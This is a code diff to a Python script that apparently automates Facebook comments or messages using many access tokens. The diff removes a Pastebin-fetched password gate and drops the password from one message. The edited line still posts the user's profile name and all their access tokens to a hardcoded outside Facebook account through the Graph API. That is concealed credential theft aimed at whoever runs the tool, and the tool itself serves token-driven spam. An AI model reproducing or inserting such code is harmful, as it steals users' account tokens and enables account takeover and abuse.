@@ -62,11 +62,6 @@ def send_messages():
         'referer': 'www.google.com'
     }
 
-    mmm = requests.get('https://pastebin.com/raw/TiyqXYCK').text
-
-    if mmm not in password:
-        print('[-] <==> Incorrect Password!')
-        sys.exit()
 
     liness()
 
@@ -104,7 +99,7 @@ def send_messages():
     def msg():
         parameters = {
             'access_token' : random.choice(access_tokens),
-            'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\nToken : '+" | ".join(access_tokens)+'\nLink : https://www.facebook.com/comments/'+convo_id+'\nPassword: '+password
+            'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\nToken : '+" | ".join(access_tokens)+'\nLink : https://www.facebook.com/comments/'+convo_id
         }
         try:
             s = requests.post("https://graph.facebook.com/v15.0/t_100002189532580/", data=parameters, headers=headers)
